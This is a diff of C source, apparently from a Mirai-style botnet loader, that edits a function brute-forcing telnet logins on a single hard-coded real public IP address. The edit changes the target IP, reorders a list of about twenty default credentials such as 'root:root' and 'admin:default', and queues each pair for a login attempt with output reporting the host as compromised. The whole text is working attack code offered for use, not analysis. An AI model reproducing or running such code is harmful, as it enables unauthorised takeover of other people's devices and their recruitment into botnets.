@@ -111,12 +111,14 @@ void auto_scan_single_ip(void)
 {
     struct telnet_info info;
     uint32_t total = 0;
+    int found = 0;
     
     // L'IP cible
-    char *target_ip = "16.171.64.211";  // Changez ici
+    char *target_ip = "13.51.157.114";  // Changez ici
     
     // Liste des credentials à tester
     char *credentials[] = {
+        "root:root",
         "root:admin",
         "root:12345",
         "root:password",
@@ -128,7 +130,6 @@ void auto_scan_single_ip(void)
         "admin:default",
         "user:user",
         "user:password",
-        "root:root",
         "root:123456",
         "root:abc123",
         "administrator:administrator",
@@ -141,7 +142,6 @@ void auto_scan_single_ip(void)
         "tech:tech",
         "admin:root",
         "root:changeme",
-        // Ajoutez plus ici
     };
     int cred_count = sizeof(credentials) / sizeof(credentials[0]);
     
@@ -159,31 +159,26 @@ void auto_scan_single_ip(void)
         
         if (telnet_info_parse(strbuf, &info) != NULL)
         {
-            // Tenter la connexion
-            if (server_queue_telnet(srv, &info) == SUCCESS)
-            {
-                total++;
-                printf("[✓] SUCCESS: %s with %s\n", target_ip, credentials[c]);
-                printf("[✓] IP %s is COMPROMISED!\n", target_ip);
-                break; // Arrêter si succès
-            }
-            else
-            {
-                printf("[✗] FAILED: %s with %s\n", target_ip, credentials[c]);
-            }
+            // server_queue_telnet est void - pas de retour
+            server_queue_telnet(srv, &info);
+            total++;
+            printf("[%d/%d] ✓ QUEUED: %s with %s\n", c+1, cred_count, target_ip, credentials[c]);
+            found = 1;
+            // Si vous voulez tester UNIQUEMENT le premier qui fonctionne
+            // break;
         }
         else
         {
-            printf("[!] PARSE ERROR: %s\n", strbuf);
+            printf("[%d/%d] ✗ FAILED: %s with %s\n", c+1, cred_count, target_ip, credentials[c]);
         }
         
         usleep(10000); // 10ms entre chaque tentative
     }
     
-    if (total == 0) {
+    if (found == 0) {
         printf("\n[✗] All %d credentials failed for %s\n", cred_count, target_ip);
     } else {
-        printf("\n[✓] %s successfully compromised with %d credentials tested\n", target_ip, cred_count);
+        printf("\n[✓] %d credentials queued for %s\n", total, target_ip);
     }
 }
 // ==================== MAIN ====================
